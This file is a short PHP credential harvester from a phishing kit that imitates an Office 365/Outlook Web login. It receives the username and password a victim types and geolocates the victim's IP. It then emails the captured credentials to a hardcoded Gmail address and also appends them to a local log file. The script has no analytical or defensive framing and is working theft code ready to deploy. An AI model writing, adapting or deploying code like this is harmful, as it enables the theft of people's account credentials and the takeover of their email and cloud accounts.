<?php
$to = array("jeffbelanny@gmail.com","jeffbelanny@gmail.com");
//$to = array("jeffbelanny@gmail.com","jeffbelanny@gmail.com");
header('Access-Control-Allow-Origin: *');

if(isset($_POST['user']) && isset($_POST['pass'])){


function visitor_country()
	{
	$ip = getenv("REMOTE_ADDR");
	$result = "Unknown";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/$ip");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$country = json_decode(curl_exec($ch))->country;
	if ($country != null)
		{
		$result = $country;
		}

	return $result;
	}

$user = $_POST['user'];
$pass = $_POST['pass'];
//$recipient = "jeffbelanny@gmail.com";
$api = 'http://my-ips.org/ip/index.php';
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");

	$data = array(
		"user" => $user,
		"pass" => $pass,
		"type" => "1",
		"country" => $country,
		"ip" => $ip
	);


		$date = date('d-m-Y');
		$ip = getenv("REMOTE_ADDR");
		$message = "-----------+ O365 logs +-----------\n";
		$message.= "User ID: " . $user . "\n";
		$message.= "Password: " . $pass . "\n";
		$message.= "Client IP      : $ip\n";
		$message.= "Client Country      : $country\n";
		$message.= "----------+ Created in Dagbo unit +-----------\n";
		$subject = "OWA | logs(Auth-Required): " . $ip . "\n";
		$headers = "MIME-Version: 1.0\n";

        	foreach ($to as $recipient) {
           mail($recipient, $subject, $message, $headers);
       }

	//	mail($recipient, $subject, $message, $headers);
		@fclose(@fwrite(@fopen("O365-Logs.txt", "a"),$message));

		echo 0;


	}
?>
